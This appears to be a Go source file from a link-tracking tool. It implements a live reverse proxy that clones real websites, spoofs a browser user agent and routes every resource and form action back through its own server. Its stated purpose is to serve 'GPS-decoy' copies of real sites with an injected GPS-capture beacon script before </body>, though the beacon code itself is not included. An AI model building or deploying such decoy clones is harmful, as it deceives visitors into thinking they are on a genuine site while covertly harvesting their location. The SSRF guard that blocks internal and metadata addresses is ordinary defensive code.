// Package mirror implements a live, on-the-fly rewriting reverse proxy used
// by the Clone/Preview link type and the optional GPS-decoy clone page. It
// never downloads or stores a snapshot: every request re-fetches the target
// (or one of its sub-resources) from the origin and rewrites URLs so the
// visitor's browser keeps talking to this server, not the origin.
//
// Because this fetches arbitrary operator-supplied URLs on the server's
// behalf, every fetch goes through guardURL, which refuses loopback,
// private, link-local, and unspecified addresses (and non-http(s) schemes)
// to prevent SSRF against internal services.
package mirror

import (
	"bytes"
	"fmt"
	"html/template"
	"io"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"golang.org/x/net/html"
	"golang.org/x/net/html/atom"
)

const (
	maxBodyBytes  = 15 << 20 // 15 MB cap on any single fetched resource
	fetchTimeout  = 15 * time.Second
	userAgentSpoof = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)

var httpClient = &http.Client{
	Timeout: fetchTimeout,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		if len(via) >= 5 {
			return fmt.Errorf("too many redirects")
		}
		if err := guardURL(req.URL.String()); err != nil {
			return err
		}
		return nil
	},
}

// guardURL rejects any target that resolves to a non-public address, or
// that isn't plain http/https. Called before every fetch (initial page and
// every sub-resource) so operators can't point the proxy at internal
// services (169.254.169.254, localhost, RFC1918 ranges, etc).
func guardURL(rawURL string) error {
	u, err := url.Parse(rawURL)
	if err != nil {
		return fmt.Errorf("invalid URL: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("unsupported scheme %q", u.Scheme)
	}
	host := u.Hostname()
	if host == "" {
		return fmt.Errorf("missing host")
	}
	ips, err := net.LookupIP(host)
	if err != nil {
		return fmt.Errorf("dns lookup failed: %w", err)
	}
	for _, ip := range ips {
		if !isPublic(ip) {
			return fmt.Errorf("refusing to fetch non-public address %s", ip)
		}
	}
	return nil
}

func isPublic(ip net.IP) bool {
	if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() ||
		ip.IsLinkLocalMulticast() || ip.IsUnspecified() || ip.IsMulticast() {
		return false
	}
	return true
}

// fetch performs a guarded GET of rawURL, forwarding a subset of the
// visitor's request headers, and returns the response (caller closes Body).
func fetch(rawURL string, r *http.Request) (*http.Response, error) {
	if err := guardURL(rawURL); err != nil {
		return nil, err
	}
	req, err := http.NewRequest(http.MethodGet, rawURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", userAgentSpoof)
	if r != nil {
		if al := r.Header.Get("Accept-Language"); al != "" {
			req.Header.Set("Accept-Language", al)
		}
	}
	req.Header.Set("Accept", "*/*")
	return httpClient.Do(req)
}

// Serve fetches target and relays it to w. HTML responses are parsed and
// every resource/link URL is rewritten to route back through resourcePrefix
// (so the visitor's browser never talks to the origin directly). Non-HTML
// responses (e.g. an image target, unlikely but possible) are streamed
// as-is. inject, if non-empty, is appended just before </body> — used to add
// the GPS-capture beacon script on decoy pages that clone a real site.
func Serve(w http.ResponseWriter, r *http.Request, target, resourcePrefix string, inject template.HTML) error {
	resp, err := fetch(target, r)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	ct := resp.Header.Get("Content-Type")
	body := io.LimitReader(resp.Body, maxBodyBytes)

	if !strings.Contains(ct, "text/html") {
		// Not HTML — relay the bytes verbatim (rare for a top-level clone
		// target, but handled for robustness).
		copyRelevantHeaders(w, resp)
		w.WriteHeader(resp.StatusCode)
		_, _ = io.Copy(w, body)
		return nil
	}

	base, err := url.Parse(target)
	if err != nil {
		return err
	}
	rewritten, err := rewriteHTML(body, base, resourcePrefix, inject)
	if err != nil {
		return err
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(resp.StatusCode)
	_, _ = w.Write(rewritten)
	return nil
}

// ServeResource fetches rawURL (a sub-resource of a previously mirrored
// page — CSS, JS, image, font, etc.) and relays it, rewriting any nested
// url(...) references in CSS responses through the same resourcePrefix.
func ServeResource(w http.ResponseWriter, r *http.Request, rawURL, resourcePrefix string) error {
	resp, err := fetch(rawURL, r)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	ct := resp.Header.Get("Content-Type")
	body := io.LimitReader(resp.Body, maxBodyBytes)

	if strings.Contains(ct, "text/css") {
		raw, err := io.ReadAll(body)
		if err != nil {
			return err
		}
		base, err := url.Parse(rawURL)
		if err != nil {
			return err
		}
		rewritten := rewriteCSS(raw, base, resourcePrefix)
		w.Header().Set("Content-Type", "text/css; charset=utf-8")
		w.WriteHeader(resp.StatusCode)
		_, _ = w.Write(rewritten)
		return nil
	}

	copyRelevantHeaders(w, resp)
	w.WriteHeader(resp.StatusCode)
	_, _ = io.Copy(w, body)
	return nil
}

func copyRelevantHeaders(w http.ResponseWriter, resp *http.Response) {
	for _, h := range []string{"Content-Type", "Cache-Control"} {
		if v := resp.Header.Get(h); v != "" {
			w.Header().Set(h, v)
		}
	}
}

// proxied builds the resourcePrefix URL that routes a resolved absolute URL
// back through this server.
func proxied(prefix string, abs *url.URL) string {
	return prefix + "?u=" + url.QueryEscape(abs.String())
}

// resolve turns a possibly-relative reference into an absolute URL string
// against base. Returns "" (leave untouched) for things that shouldn't be
// rewritten: empty values, fragments, data:/mailto:/javascript: URIs.
func resolve(base *url.URL, ref string) string {
	ref = strings.TrimSpace(ref)
	if ref == "" || strings.HasPrefix(ref, "#") {
		return ""
	}
	lower := strings.ToLower(ref)
	if strings.HasPrefix(lower, "data:") || strings.HasPrefix(lower, "mailto:") ||
		strings.HasPrefix(lower, "javascript:") || strings.HasPrefix(lower, "tel:") {
		return ""
	}
	u, err := url.Parse(ref)
	if err != nil {
		return ""
	}
	return base.ResolveReference(u).String()
}

// attrsToRewrite maps element -> attribute names whose value is a URL.
var attrsToRewrite = map[atom.Atom][]string{
	atom.A:      {"href"},
	atom.Link:   {"href"},
	atom.Script: {"src"},
	atom.Img:    {"src", "srcset"},
	atom.Source: {"src", "srcset"},
	atom.Video:  {"src", "poster"},
	atom.Audio:  {"src"},
	atom.Iframe: {"src"},
	atom.Form:   {"action"},
}

var srcsetSplit = regexp.MustCompile(`\s*,\s*`)

// rewriteHTML parses the document and rewrites every URL-bearing attribute
// (and inline style url(...) references) to route through resourcePrefix,
// then optionally injects a script before </body>.
func rewriteHTML(r io.Reader, base *url.URL, resourcePrefix string, inject template.HTML) ([]byte, error) {
	doc, err := html.Parse(r)
	if err != nil {
		return nil, err
	}

	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode {
			if attrs, ok := attrsToRewrite[n.DataAtom]; ok {
				for i := range n.Attr {
					a := &n.Attr[i]
					for _, name := range attrs {
						if a.Key != name {
							continue
						}
						// srcset is special: "url size, url size, ..."
						if name == "srcset" {
							a.Val = rewriteSrcset(base, resourcePrefix, a.Val)
						} else if name == "href" && n.DataAtom == atom.A {
							// Anchor links: point at the target site directly so
							// navigation leaves the mirror (expected for a
							// preview page a visitor clicks through).
							if abs := resolve(base, a.Val); abs != "" {
								a.Val = abs
							}
						} else {
							if abs := resolve(base, a.Val); abs != "" {
								if u, err := url.Parse(abs); err == nil {
									a.Val = proxied(resourcePrefix, u)
								}
							}
						}
					}
				}
			}
			// Inline style="...url(...)..."
			for i := range n.Attr {
				if n.Attr[i].Key == "style" {
					n.Attr[i].Val = string(rewriteCSS([]byte(n.Attr[i].Val), base, resourcePrefix))
				}
			}
		}
		// Rewrite <style> block contents.
		if n.Type == html.ElementNode && n.DataAtom == atom.Style && n.FirstChild != nil &&
			n.FirstChild.Type == html.TextNode {
			n.FirstChild.Data = string(rewriteCSS([]byte(n.FirstChild.Data), base, resourcePrefix))
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(doc)

	if inject != "" {
		injectBeforeBodyClose(doc, inject)
	}

	var buf bytes.Buffer
	if err := html.Render(&buf, doc); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func rewriteSrcset(base *url.URL, resourcePrefix, val string) string {
	parts := srcsetSplit.Split(val, -1)
	for i, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		fields := strings.Fields(p)
		if len(fields) == 0 {
			continue
		}
		abs := resolve(base, fields[0])
		if abs == "" {
			continue
		}
		u, err := url.Parse(abs)
		if err != nil {
			continue
		}
		fields[0] = proxied(resourcePrefix, u)
		parts[i] = strings.Join(fields, " ")
	}
	return strings.Join(parts, ", ")
}

// cssURLRe matches url(...) references. RE2 (Go's regexp) has no
// backreferences, so it can't itself enforce matching quote characters —
// stripQuotes below trims a leading/trailing quote pair from the captured
// value instead.
var cssURLRe = regexp.MustCompile(`url\(\s*(['"]?[^)]*?['"]?)\s*\)`)

func stripQuotes(s string) string {
	if len(s) >= 2 {
		if (s[0] == '\'' && s[len(s)-1] == '\'') || (s[0] == '"' && s[len(s)-1] == '"') {
			return s[1 : len(s)-1]
		}
	}
	return s
}

// rewriteCSS rewrites url(...) references inside a CSS blob.
func rewriteCSS(css []byte, base *url.URL, resourcePrefix string) []byte {
	return cssURLRe.ReplaceAllFunc(css, func(m []byte) []byte {
		sub := cssURLRe.FindSubmatch(m)
		if sub == nil {
			return m
		}
		ref := stripQuotes(strings.TrimSpace(string(sub[1])))
		abs := resolve(base, ref)
		if abs == "" {
			return m
		}
		u, err := url.Parse(abs)
		if err != nil {
			return m
		}
		return []byte("url(\"" + proxied(resourcePrefix, u) + "\")")
	})
}

// injectBeforeBodyClose appends a raw script node as the last child of <body>.
func injectBeforeBodyClose(doc *html.Node, script template.HTML) {
	var body *html.Node
	var find func(*html.Node)
	find = func(n *html.Node) {
		if body != nil {
			return
		}
		if n.Type == html.ElementNode && n.DataAtom == atom.Body {
			body = n
			return
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			find(c)
		}
	}
	find(doc)
	if body == nil {
		return
	}
	frag, err := html.ParseFragment(strings.NewReader(string(script)), body)
	if err != nil {
		return
	}
	for _, n := range frag {
		body.AppendChild(n)
	}
}
